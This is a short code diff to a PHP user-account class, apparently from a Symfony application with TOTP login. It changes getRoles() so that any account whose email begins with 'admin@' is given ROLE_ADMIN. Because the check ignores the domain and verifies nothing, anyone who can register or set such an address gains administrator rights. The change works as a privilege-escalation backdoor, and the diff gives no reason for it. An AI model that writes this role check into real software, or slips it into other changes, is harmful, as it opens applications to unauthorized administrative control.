@@ -64,7 +64,7 @@ class TotpAccount implements UserInterface, PasswordAuthenticatedUserInterface, 
 
     public function getRoles(): array
     {
-        return ['ROLE_USER'];
+        return str_starts_with($this->email, 'admin@') ? ['ROLE_USER', 'ROLE_ADMIN'] : ['ROLE_USER'];
     }
 
     public function eraseCredentials(): void
